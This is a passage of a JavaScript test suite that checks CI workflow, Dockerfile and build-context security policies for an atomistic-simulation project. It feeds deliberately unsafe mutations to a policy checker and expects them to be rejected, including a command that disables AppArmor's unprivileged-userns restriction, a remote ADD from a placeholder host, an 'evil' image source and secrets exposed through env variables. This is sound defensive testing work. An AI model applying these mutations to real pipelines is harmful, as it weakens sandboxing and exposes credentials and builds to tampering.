      ['AppArmor userns canary removal', (workflow) => {
        const step = protectedStep(
          workflow, 'execute', 'Load and canary the exact Chromium AppArmor userns profile',
        );
        step.run = step.run.replace(
          '/usr/bin/unshare --user --map-root-user /bin/true', '/bin/true',
        );
      }],
      ['AppArmor global restriction disabled', (workflow) => {
        const step = protectedStep(
          workflow, 'execute', 'Load and canary the exact Chromium AppArmor userns profile',
        );
        step.run += '\necho 0 | sudo tee /proc/sys/kernel/apparmor_restrict_unprivileged_userns\n';
      }],
      ['AppArmor any-mode collision detection removal', (workflow) => {
        const step = protectedStep(
          workflow, 'execute', 'Load and canary the exact Chromium AppArmor userns profile',
        );
        step.run = step.run.replace(
          'grep -Eq -- "^$BROWSER_APPARMOR_PROFILE \\\\([^)]*\\\\)$"',
          'grep -Fqx -- "$BROWSER_APPARMOR_PROFILE (unconfined)"',
        );
      }],
      ['cross-mode world-session identity drift', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Run the three protected private browser modes');
        step.run = step.run.replace(
          '--session-id "v049-openmm-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"',
          '--session-id "v049-happy-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"',
        );
      }],
      ['browser context-loss mode removal', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Run the three protected private browser modes');
        step.run = step.run.replace('--mode context-loss', '--mode happy-path');
      }],
      ['browser composer substitution', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Compose the sanitized protected browser evidence');
        step.run = step.run.replace('compose-protected-browser-evidence-v049.mjs', 'unlocked-compose.mjs');
      }],
      ['browser cleanup no longer always runs', (workflow) => {
        const step = protectedStep(
          workflow, 'execute',
          'Unload AppArmor profile and remove every private browser execution root',
        );
        delete step.if;
      }],
      ['browser cleanup root removal omitted', (workflow) => {
        const step = protectedStep(
          workflow, 'execute',
          'Unload AppArmor profile and remove every private browser execution root',
        );
        step.run = step.run.replace('"$BROWSER_ROLLDOWN_ROOT"; do', '"$BROWSER_RECEIPT_ROOT"; do');
      }],
      ['browser cleanup temporary profile source removal omitted', (workflow) => {
        const step = protectedStep(
          workflow, 'execute',
          'Unload AppArmor profile and remove every private browser execution root',
        );
        step.run = step.run.replace('sudo rm -f -- "$profile_source"', 'true');
      }],
      ['raw producer output upload', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Upload only the allowlisted protected-CI evidence');
        step.with.path += '${{ env.PRODUCER_OUTPUT }}\n';
      }],
      ['unbounded retention', (workflow) => {
        const step = protectedStep(workflow, 'execute', 'Upload only the allowlisted protected-CI evidence');
        step.with['retention-days'] = 90;
      }],
      ['OIDC in producer job', (workflow) => {
        workflow.jobs.execute.permissions['id-token'] = 'write';
      }],
      ['repository checkout in attest', (workflow) => {
        workflow.jobs.attest.steps.splice(4, 0, {
          name: 'Checkout before attestation',
          uses: ATOMISTIC_BOOTSTRAP_VERIFY_CHECKOUT_ACTION,
          with: { 'persist-credentials': false, 'fetch-depth': 0 },
        });
      }],
      ['cross-run artifact download', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Download the exact allowlisted evidence artifact from this run');
        step.with['run-id'] = '123';
      }],
      ['metadata byte-bound removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace('metadataSize > maximumMetadataBytes', 'false');
      }],
      ['metadata identity encoding request removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace("    'accept-encoding': 'identity',\n", '');
      }],
      ['compressed metadata response acceptance', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          "contentEncoding.trim().toLowerCase() !== 'identity'",
          'false',
        );
      }],
      ['browser canonical check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace('browserBytes.equals(canonicalJsonBytes(browser))', 'true');
      }],
      ['browser self-digest check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'browserEvidenceDigest !== sha256(canonicalJsonBytes(browserPreimage))',
          'false',
        );
      }],
      ['browser source-revision binding removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace('browser.sourceRevision !== process.env.GITHUB_SHA', 'false');
      }],
      ['outer control digest checks removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace('outerControlDigestKeys.some', '[].some');
      }],
      ['browser complete runtime lock check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'canonicalJson(browser.browserRuntime) !== canonicalJson(expectedBrowserRuntime)',
          'false',
        );
      }],
      ['browser client byte binding check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'canonicalJson(Object.keys(browser.client).sort())',
          'canonicalJson(browserClientKeys)',
        );
      }],
      ['browser conservative claims check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'canonicalJson(browser.claims) !== canonicalJson(expectedBrowserClaims)',
          'false',
        );
      }],
      ['browser exact mode-result check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'browser.modeResults.length !== expectedBrowserModes.length',
          'false',
        );
      }],
      ['browser exact interruption-frame check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'mode.renderedFrameCount !== expected.renderedFrameCount',
          'false',
        );
      }],
      ['browser draw-observation check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'mode.browserDrawObserved !== expected.browserDrawObserved',
          'false',
        );
      }],
      ['browser trajectory-completion check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'mode.trajectoryCompleted !== expected.trajectoryCompleted',
          'false',
        );
      }],
      ['browser isolation receipt check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'canonicalJson(browser.isolation) !== canonicalJson(expectedBrowserIsolation)',
          'false',
        );
      }],
      ['browser cross-mode binding check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'canonicalJson(browser.crossMode) !== canonicalJson(expectedBrowserCrossMode)',
          'false',
        );
      }],
      ['browser aggregate cleanup check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'canonicalJson(browser.cleanup) !== canonicalJson(expectedBrowserCleanup)',
          'false',
        );
      }],
      ['browser outer projection check removal', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Verify every downloaded evidence file and envelope binding');
        step.run = step.run.replace(
          'canonicalJson(envelope.browserEvidence)',
          'canonicalJson(expectedBrowserProjection)',
        );
      }],
      ['raw receipt attestation', (workflow) => {
        const step = protectedStep(workflow, 'attest', 'Attest only the verified sanitized evidence envelope');
        step.with['subject-path'] = '${{ runner.temp }}/tailing-openmm-tip3p-attest/openmm-tip3p-control-receipt.json';
      }],
      ['unreviewed sibling job', (workflow) => {
        workflow.jobs.publish = { 'runs-on': 'ubuntu-24.04', steps: [] };
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedOpenMmProtected(mutate, { semanticOnly: true }), label)
        .not.toEqual([]);
    }
  });

  it('binds even comments and whitespace to the reviewed source bytes', () => {
    expect(inspectWorkflowSource(
      OPENMM_TIP3P_PROTECTED_WORKFLOW_PATH,
      `${openMmTip3pProtectedSource}# unreviewed drift\n`,
    ).join('\n')).toMatch(/complete reviewed workflow bytes drifted/);
  });
});

describe('Dockerfile source policy', () => {
  it('accepts the pinned frontend, required base argument and named wheelhouse context', () => {
    const source = `# syntax=${PINNED_DOCKERFILE_FRONTEND}\nARG BASE_IMAGE\nFROM \${BASE_IMAGE} AS builder\nCOPY --from=wheelhouse / /wheelhouse/\nFROM \${BASE_IMAGE} AS runtime\nCOPY --from=builder /opt/venv /opt/venv\n`;
    expect(inspectDockerfileSource('safe.Dockerfile', source)).toEqual([]);
  });

  it('rejects a mutable frontend, default base, external COPY, networked RUN, secrets and remote ADD', () => {
    const source = '# syntax=docker/dockerfile:1.7\nARG BASE_IMAGE=python:latest\nFROM python:latest AS runtime\nCOPY --from=evil:latest /x /x\nRUN --mount=type=secret pip check\nADD https://example.invalid/x /x\n';
    expect(inspectDockerfileSource('unsafe.Dockerfile', source)).toHaveLength(7);
  });

  it('requires both atomistic images to remove the reviewed setuptools startup hook', () => {
    for (const [relativePath, source] of [
      ['atomistic/containers/mattersim.Dockerfile', matterSimDockerfileSource],
      ['atomistic/containers/mace.Dockerfile', maceDockerfileSource],
    ]) {
      expect(inspectDockerfileSource(relativePath, source), relativePath).toEqual([]);
      expect(
        inspectDockerfileSource(relativePath, source.replace('rm -- "$startup_hook"', ':')),
        `${relativePath} without removal`,
      ).not.toEqual([]);
      const reordered = source
        .replace('    /opt/tailing-venv/bin/python -I -m pip check\n', '    true\n')
        .replace(
          '    rm -- "$startup_hook" && \\\n',
          '    /opt/tailing-venv/bin/python -I -m pip check && \\\n    rm -- "$startup_hook" && \\\n',
        );
      expect(reordered).not.toBe(source);
      expect(inspectDockerfileSource(relativePath, reordered), `${relativePath} reordered`).not.toEqual([]);
      expect(source.match(/-mindepth 1 -maxdepth 1/g)).toHaveLength(2);
      expect(
        inspectDockerfileSource(relativePath, source.replace('-mindepth 1 -maxdepth 1', '-mindepth 1')),
        `${relativePath} with recursive startup-hook scan`,
      ).not.toEqual([]);
      expect(ATOMISTIC_DOCKERFILE_DIGESTS[relativePath]).toMatch(/^sha256:[0-9a-f]{64}$/);
    }
  });

  it('accepts only the reviewed OpenMM control image with its in-source base digest', () => {
    const relativePath = 'atomistic/containers/openmm-water.Dockerfile';
    expect(inspectDockerfileSource(relativePath, openMmWaterDockerfileSource)).toEqual([]);
    expect(ATOMISTIC_DOCKERFILE_DIGESTS[relativePath])
      .toBe(`sha256:${createHash('sha256').update(openMmWaterDockerfileSource).digest('hex')}`);
    expect(inspectDockerfileSource(
      relativePath,
      openMmWaterDockerfileSource.replace('\nFROM --platform', '\nARG BASE_IMAGE\nFROM --platform'),
    ).join('\n')).toMatch(/reviewed Dockerfile bytes drifted|no BASE_IMAGE argument/);
  });
});

describe('full-candidate registration-only workflow policy', () => {
  it('accepts only the digest-bound no-matching-push workflow with a false job canary', () => {
    expect(inspectWorkflowSource(
      FULL_CANDIDATE_REGISTRATION_WORKFLOW_PATH,
      fullCandidateRegistrationSource,
    )).toEqual([]);
    expect(inspectFullCandidateRegistrationWorkflowSource(
      FULL_CANDIDATE_REGISTRATION_WORKFLOW_PATH,
      fullCandidateRegistrationSource,
    )).toEqual([]);
    expect(createHash('sha256').update(fullCandidateRegistrationSource).digest('hex'))
      .toBe(FULL_CANDIDATE_REGISTRATION_WORKFLOW_SHA256);
    expect(Buffer.byteLength(fullCandidateRegistrationSource))
      .toBe(FULL_CANDIDATE_REGISTRATION_WORKFLOW_SIZE_BYTES);
    expect(FULL_CANDIDATE_REGISTRATION_WORKFLOW_PATH)
      .toBe(FULL_CANDIDATE_PRODUCER_WORKFLOW.path);
    expect(FULL_CANDIDATE_REGISTRATION_WORKFLOW_NAME)
      .toBe(FULL_CANDIDATE_PRODUCER_WORKFLOW.name);
    expect(FULL_CANDIDATE_PRODUCER_WORKFLOW).toMatchObject({
      configured: false,
      id: null,
    });

    const workflow = parseYaml(fullCandidateRegistrationSource);
    expect(workflow.on).toEqual({
      push: {
        'branches-ignore': ['**'],
        'tags-ignore': ['**'],
      },
    });
    expect(workflow.permissions).toEqual({});
    expect(Object.keys(workflow.jobs)).toEqual(['registration-quarantine']);
    expect(workflow.jobs['registration-quarantine']).toMatchObject({
      if: '${{ false }}',
      'runs-on': 'ubuntu-24.04',
      'timeout-minutes': 1,
      permissions: {},
    });
    expect(workflow.jobs['registration-quarantine'].steps).toHaveLength(1);
    expect(fullCandidateRegistrationSource).not.toMatch(
      /workflow_dispatch|workflow_call|repository_dispatch|schedule|ImageVersion|RUNNER_ARCH|gh version/,
    );
  });

  it('rejects every trigger or all-ref filter expansion', () => {
    const cases = [
      ['workflow dispatch', (workflow) => { workflow.on.workflow_dispatch = null; }],
      ['workflow call', (workflow) => { workflow.on.workflow_call = null; }],
      ['repository dispatch', (workflow) => { workflow.on.repository_dispatch = null; }],
      ['schedule', (workflow) => { workflow.on.schedule = [{ cron: '0 0 * * *' }]; }],
      ['pull request', (workflow) => { workflow.on.pull_request = null; }],
      ['branch filter removal', (workflow) => { delete workflow.on.push['branches-ignore']; }],
      ['tag filter removal', (workflow) => { delete workflow.on.push['tags-ignore']; }],
      ['branch wildcard narrowing', (workflow) => { workflow.on.push['branches-ignore'] = ['main']; }],
      ['tag wildcard narrowing', (workflow) => { workflow.on.push['tags-ignore'] = ['v*']; }],
      ['inputs', (workflow) => {
        workflow.on.workflow_dispatch = { inputs: { execute: { required: false, type: 'boolean' } } };
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedFullCandidateRegistration(mutate), label).not.toEqual([]);
    }
  });

  it('rejects permission, job guard, runner, timeout and job-count drift', () => {
    const cases = [
      ['top-level read permission', (workflow) => { workflow.permissions = { contents: 'read' }; }],
      ['top-level write permission', (workflow) => { workflow.permissions = { contents: 'write' }; }],
      ['job permission', (workflow) => {
        workflow.jobs['registration-quarantine'].permissions = { contents: 'read' };
      }],
      ['job guard deletion', (workflow) => { delete workflow.jobs['registration-quarantine'].if; }],
      ['truthy job guard', (workflow) => { workflow.jobs['registration-quarantine'].if = '${{ true }}'; }],
      ['runner drift', (workflow) => {
        workflow.jobs['registration-quarantine']['runs-on'] = 'ubuntu-latest';
      }],
      ['timeout drift', (workflow) => {
        workflow.jobs['registration-quarantine']['timeout-minutes'] = 2;
      }],
      ['additional job', (workflow) => {
        workflow.jobs.execute = {
          if: '${{ false }}',
          'runs-on': 'ubuntu-24.04',
          permissions: {},
          steps: [],
        };
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedFullCandidateRegistration(mutate), label).not.toEqual([]);
    }
  });

  it('rejects every execution, context, secret and topology expansion', () => {
    const cases = [
      ['additional step', (workflow) => {
        workflow.jobs['registration-quarantine'].steps.push({ run: 'exit 1' });
      }],
      ['checkout', (workflow) => {
        workflow.jobs['registration-quarantine'].steps[0] = {
          uses: `actions/checkout@${'a'.repeat(40)}`,
          with: { 'persist-credentials': false },
        };
      }],
      ['upload artifact', (workflow) => {
        workflow.jobs['registration-quarantine'].steps[0] = {
          uses: `actions/upload-artifact@${'a'.repeat(40)}`,
          with: { name: 'forbidden', path: '.' },
        };
      }],
      ['local action', (workflow) => {
        workflow.jobs['registration-quarantine'].steps[0] = { uses: './.github/actions/local' };
      }],
      ['top-level env', (workflow) => { workflow.env = { TOKEN: '${{ secrets.TOKEN }}' }; }],
      ['job env', (workflow) => {
        workflow.jobs['registration-quarantine'].env = { TOKEN: '${{ secrets.TOKEN }}' };
      }],
      ['step env', (workflow) => {
        workflow.jobs['registration-quarantine'].steps[0].env = { TOKEN: '${{ secrets.TOKEN }}' };
      }],
      ['job outputs', (workflow) => { workflow.jobs['registration-quarantine'].outputs = { x: 'y' }; }],
      ['job secrets', (workflow) => { workflow.jobs['registration-quarantine'].secrets = 'inherit'; }],
      ['concurrency', (workflow) => { workflow.concurrency = 'producer'; }],
      ['container', (workflow) => {
        workflow.jobs['registration-quarantine'].container = `ubuntu@sha256:${'a'.repeat(64)}`;
      }],
      ['services', (workflow) => { workflow.jobs['registration-quarantine'].services = {}; }],
      ['strategy', (workflow) => {
        workflow.jobs['registration-quarantine'].strategy = { matrix: { model: ['mace'] } };
      }],
    ];
    for (const [label, mutate] of cases) {
      expect(inspectMutatedFullCandidateRegistration(mutate), label).not.toEqual([]);
    }
  });

  it('rejects command, duplicate-key, path, byte and key-order drift', () => {
    expect(inspectMutatedFullCandidateRegistration((workflow) => {
      workflow.jobs['registration-quarantine'].steps[0].run = 'set -euo pipefail\nexit 0\n';
    })).not.toEqual([]);
    expect(inspectFullCandidateRegistrationWorkflowSource(
      FULL_CANDIDATE_REGISTRATION_WORKFLOW_PATH,
      `${fullCandidateRegistrationSource}\npermissions: { contents: read }\n`,
    ).join('\n')).toMatch(/invalid or contains duplicate keys/);
    expect(inspectFullCandidateRegistrationWorkflowSource(
      '.github/workflows/renamed-full-candidate.yml',
      fullCandidateRegistrationSource,
    ).join('\n')).toMatch(/reviewed path/);
    expect(inspectFullCandidateRegistrationWorkflowSource(
      FULL_CANDIDATE_REGISTRATION_WORKFLOW_PATH,
      `${fullCandidateRegistrationSource}# byte drift\n`,
    ).join('\n')).toMatch(/complete reviewed.*bytes drifted/);

    const parsed = parseYaml(fullCandidateRegistrationSource);
    const reordered = {
      on: parsed.on,
      name: parsed.name,
      permissions: parsed.permissions,
      jobs: parsed.jobs,
    };
    expect(inspectFullCandidateRegistrationWorkflow(
      reordered,
      fullCandidateRegistrationSource,
    ).join('\n')).toMatch(/key set or order drifted|exact YAML shape/);
  });

  it('returns a structured failure for cyclic YAML aliases', () => {
    const cyclicSource = 'name: cyclic\n"on": push\njobs:\n  loop: &loop\n    self: *loop\n';
    expect(inspectWorkflowSource(
      FULL_CANDIDATE_REGISTRATION_WORKFLOW_PATH,
      cyclicSource,
    )).toEqual([
      `${FULL_CANDIDATE_REGISTRATION_WORKFLOW_PATH}: cyclic YAML aliases are forbidden.`,
    ]);
    expect(inspectFullCandidateRegistrationWorkflowSource(
      FULL_CANDIDATE_REGISTRATION_WORKFLOW_PATH,
      cyclicSource,
    ).join('\n')).toMatch(/cyclic YAML aliases are forbidden/);
    expect(inspectFullCandidateRegistrationWorkflow(
      parseYaml(cyclicSource),
      cyclicSource,
    ).join('\n')).toMatch(/cyclic YAML aliases are forbidden/);
  });
});

describe('Docker build-context policy', () => {
  it('accepts only the exact deny-all atomistic allowlist', () => {
    const safe = `${DOCKERIGNORE_ALLOWLIST.join('\n')}\n`;
    expect(checkedInDockerignoreSource).toBe(safe);
    expect(inspectDockerignoreSource('.dockerignore', checkedInDockerignoreSource)).toEqual([]);
    expect(inspectDockerignoreSource('.dockerignore', safe)).toEqual([]);
    expect(inspectDockerignoreSource('.dockerignore', `${safe}!.env\n`).join('\n')).toMatch(/exact deny-all allowlist/);
    expect(inspectDockerignoreSource('.dockerignore', safe.replace('**\n', '')).join('\n')).toMatch(/exact deny-all allowlist/);
  });
});

describe('atomistic bootstrap supply-chain policy', () => {
  it('accepts the checked-in manual dual-model non-promotional workflow', () => {
    expect(inspectWorkflowSource(ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH, atomisticBootstrapSource)).toEqual([]);
    expect(inspectAtomisticBootstrapQuarantineSource(
      ATOMISTIC_BOOTSTRAP_QUARANTINE_PATH,
      atomisticBootstrapQuarantineSource,
    )).toEqual([]);
    expect(createHash('sha256').update(atomisticBootstrapQuarantineSource).digest('hex'))
      .toBe(ATOMISTIC_BOOTSTRAP_QUARANTINE_SHA256);
    const quarantine = JSON.parse(atomisticBootstrapQuarantineSource);
    expect(quarantine.schemaVersion).toBe('tf.atomistic-bootstrap-quarantine/0.2');
    expect(quarantine.enforcementMode).toBe('deny-quarantined-require-exact-selected/v1');
    expect(quarantine.quarantinedRunner.runnerDigest).toBe(ATOMISTIC_BOOTSTRAP_QUARANTINED_RUNNER_DIGEST);
    expect(quarantine.quarantinedRunner.runtimeLock.rawDigest)
      .toBe(`sha256:${ATOMISTIC_HISTORICAL_RUNTIME_DISCOVERY_LOCK_SHA256}`);
    expect(quarantine.quarantinedRunner.acceptedReplicaCount).toBe(0);
    expect(quarantine.quarantinedRunner.nonRetroactiveRunIds).toEqual([33231316217, 33231323492]);
    expect(quarantine.selectedRunner.runnerDigest).toBe(ATOMISTIC_BOOTSTRAP_SELECTED_RUNNER_DIGEST);
    expect(quarantine.selectedRunner.runtimeSourceRevision).toBe(ATOMISTIC_RUNTIME_SOURCE_REVISION);
    expect(quarantine.selectedRunner.sourceDateEpoch).toBe(ATOMISTIC_RUNTIME_SOURCE_DATE_EPOCH);
    expect(quarantine.selectedRunner.sourceManifestDigest).toBe(ATOMISTIC_SOURCE_MANIFEST_DIGEST);
    expect(quarantine.selectedRunner.sourceFiles).toEqual(ATOMISTIC_SELECTED_SOURCE_FILES);
    expect(quarantine.selectedRunner.materializationDigest).toBe(ATOMISTIC_MATERIALIZATION_DIGEST);
    expect(quarantine.selectedRunner.materializations).toEqual(ATOMISTIC_RUNTIME_MATERIALIZATIONS);
    expect(quarantine.claims).toEqual({
      evidenceClass: 'bootstrap-not-reproduced',
      promotionEligible: false,
      comparable: false,
      reproduced: false,
    });
    expect(ATOMISTIC_BOOTSTRAP_NODE_VERSION).toBe('24.16.0');
    expect(ATOMISTIC_BOOTSTRAP_BASE_IMAGE).toMatch(/^python:3\.12\.13-slim-bookworm@sha256:[0-9a-f]{64}$/);
    expect(ATOMISTIC_BOOTSTRAP_BASE_AMD64_DIGEST).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(PYTHON_HOSTLIST_SDIST_URL).toMatch(/^https:\/\/files\.pythonhosted\.org\//);
    expect(PYTHON_HOSTLIST_SDIST_SHA256).toMatch(/^[0-9a-f]{64}$/);
    expect(createHash('sha256').update(pythonHostlistBuildLockSource).digest('hex')).toBe(PYTHON_HOSTLIST_BUILD_LOCK_SHA256);
    expect(createHash('sha256').update(pythonHostlistBuildScriptSource).digest('hex')).toBe(PYTHON_HOSTLIST_BUILD_SCRIPT_SHA256);
    expect(createHash('sha256').update(pythonHostlistVerifierSource).digest('hex')).toBe(PYTHON_HOSTLIST_VERIFIER_SHA256);
    expect(createHash('sha256').update(bootstrapOutcomeSource).digest('hex')).toBe(ATOMISTIC_BOOTSTRAP_OUTCOME_SCRIPT_SHA256);
    expect(createHash('sha256').update(runtimeInventoryVerifierSource).digest('hex')).toBe(ATOMISTIC_RUNTIME_INVENTORY_VERIFIER_SHA256);
    expect(createHash('sha256').update(runtimeInputContractSource).digest('hex')).toBe(ATOMISTIC_RUNTIME_INPUT_CONTRACT_SHA256);
    expect(createHash('sha256').update(containerObservationWriterSource).digest('hex')).toBe(ATOMISTIC_CONTAINER_OBSERVATION_WRITER_SHA256);
    expect(ATOMISTIC_RUNTIME_DISCOVERY_LOCK_SHA256)
      .toBe('5ce8c368b73f2f34e414caa349b89096ee844b3135a724045e65fbb5bd1aed2e');
    expect(ATOMISTIC_CURRENT_RUNTIME_LOCK_SHA256)
      .toBe('b8c352aacfef3f74210d2dbf2002400887e35d21670f5f93da6a8003670bafa1');
    expect(createHash('sha256').update(atomisticRuntimeLockSource).digest('hex'))
      .toBe(ATOMISTIC_CURRENT_RUNTIME_LOCK_SHA256);
    expect(ATOMISTIC_HISTORICAL_RUNTIME_DISCOVERY_LOCK_SHA256)
      .toBe('79e72ba821cfaac298a4898a9b09bd4f0159d3560cdf8f2ac5ba4b005402f6fe');
    const workflow = parseYaml(atomisticBootstrapSource);
    const checkout = workflow.jobs.bootstrap.steps.find((step) => step.name === 'Check out the dispatched revision without credentials');
    expect(checkout?.with).toEqual({ 'persist-credentials': false, 'fetch-depth': 0 });
    expect(atomisticResolveLockSource).toContain(
      `PYTHON_HOSTLIST_BUILD_TOOL_LOCK_DIGEST = "sha256:${PYTHON_HOSTLIST_BUILD_LOCK_SHA256}"`,
    );
    expect(atomisticResolveLockSource).toContain(
      `PYTHON_HOSTLIST_BUILD_SCRIPT_DIGEST = "sha256:${PYTHON_HOSTLIST_BUILD_SCRIPT_SHA256}"`,
    );
    expect(atomisticResolveLockSource).toContain(`"filename": "${SETUPTOOLS_RUNTIME_WHEEL_FILENAME}"`);
    expect(atomisticResolveLockSource).toContain(`"sha256": "sha256:${SETUPTOOLS_RUNTIME_WHEEL_SHA256}"`);
    expect(atomisticResolveLockSource).toContain(`"sha256": "sha256:${SETUPTOOLS_STARTUP_HOOK_SHA256}"`);
    expect(maceBootstrapInput).toMatch(/^setuptools==84\.0\.0$/m);
    expect(matterSimBootstrapInput).toMatch(/^setuptools==84\.0\.0$/m);
    expect(matterSimBootstrapInput).toMatch(/^pymatgen==2025\.4\.17$/m);
    expect(matterSimBootstrapInput).toMatch(/^pymatgen-io-validation==0\.1\.2$/m);
  });

  it('rejects quarantine deletion, legacy/unknown runner bypass, or retrospective acceptance', () => {
    const workflowCases = [
      ['deleted quarantine guard', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.slice(0, step.run.indexOf("node --input-type=module <<'NODE'"));
      }],
      ['quarantine program redirected to a no-op', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace("node --input-type=module <<'NODE'", "true <<'NODE'");
      }],
      ['active quarantine failure bypassed', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace(
          /throw new Error\(\n\s+`BOOTSTRAP_QUARANTINE_ACTIVE/,
          (match) => match.replace('throw new Error', 'console.error'),
        );
      }],
      ['legacy candidate comparison bypassed', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace(
          'if (candidateLegacyDigest === quarantine.quarantinedRunner.runnerDigest)',
          'if (false && candidateLegacyDigest === quarantine.quarantinedRunner.runnerDigest)',
        );
      }],
      ['unknown candidate accepted', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace(
          'if (!candidateMappingIsExact || candidateRunnerDigest !== quarantine.selectedRunner.runnerDigest)',
          'if (false && (!candidateMappingIsExact || candidateRunnerDigest !== quarantine.selectedRunner.runnerDigest))',
        );
      }],
      ['selected digest comparison bypassed', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace(
          'candidateRunnerDigest !== quarantine.selectedRunner.runnerDigest',
          'false',
        );
      }],
      ['historical object read bypassed', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace('const historicLock = readCommitBlob(', 'const historicLock = readBoundedRegularFile(');
      }],
      ['Git blob OID recomputation bypassed', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace('gitBlobOid(bytes) !== match[3]', 'false');
      }],
      ['Git global configuration re-enabled', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace("GIT_CONFIG_GLOBAL: '/dev/null'", "GIT_CONFIG_GLOBAL: process.env.HOME");
      }],
      ['quarantine size bound expanded', (workflow) => {
        const step = namedStep(workflow, 'Refuse non-main, non-Linux, or non-x86_64 dispatches');
        step.run = step.run.replace('readBoundedRegularFile(quarantinePath, 16 * 1024)', 'readBoundedRegularFile(quarantinePath, 64 * 1024)');
      }],
    ];
    for (const [label, mutate] of workflowCases) {
      expect(inspectMutatedBootstrap(mutate), label).not.toEqual([]);
    }

    const changedRunner = atomisticBootstrapQuarantineSource.toString('utf8').replace(
      ATOMISTIC_BOOTSTRAP_QUARANTINED_RUNNER_DIGEST,
      `sha256:${'0'.repeat(64)}`,
    );
    expect(inspectAtomisticBootstrapQuarantineSource(
      ATOMISTIC_BOOTSTRAP_QUARANTINE_PATH,
      changedRunner,
    )).not.toEqual([]);
    const retroactivelyAccepted = atomisticBootstrapQuarantineSource.toString('utf8')
      .replace('"acceptedReplicaCount": 0', '"acceptedReplicaCount": 2');
    expect(inspectAtomisticBootstrapQuarantineSource(
      ATOMISTIC_BOOTSTRAP_QUARANTINE_PATH,
      retroactivelyAccepted,
    )).not.toEqual([]);
    const changedRunIds = atomisticBootstrapQuarantineSource.toString('utf8')
      .replace('33231323492', '33231323493');
    expect(inspectAtomisticBootstrapQuarantineSource(
      ATOMISTIC_BOOTSTRAP_QUARANTINE_PATH,
      changedRunIds,
    )).not.toEqual([]);
  });

  it('rejects non-boolean false promotional claims at any nested quarantine depth', () => {
    for (const field of ['promotionEligible', 'promotionTrustRoot', 'comparable', 'reproduced']) {
      for (const value of [true, null, 0, 'false']) {
        const quarantine = JSON.parse(atomisticBootstrapQuarantineSource);
        quarantine.selectedRunner.audit = { nested: { [field]: value } };
        expect(inspectAtomisticBootstrapQuarantineSource(
          ATOMISTIC_BOOTSTRAP_QUARANTINE_PATH,
          `${JSON.stringify(quarantine, null, 2)}\n`,
        ), `${field}=${JSON.stringify(value)}`).not.toEqual([]);
      }
    }
  });

  it('keeps failed guard dispatches on the always-run outcome publication path', () => {
    const workflow = parseYaml(atomisticBootstrapSource);
    const staging = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
    const upload = namedStep(workflow, 'Upload the allowlisted bootstrap bundle');
    expect(staging.if).toBe('always()');
    expect(staging.env.STAGE_GUARD).toBe('${{ steps.guard.outcome }}');
    expect(staging.run).toContain('--stage "guard=$STAGE_GUARD"');
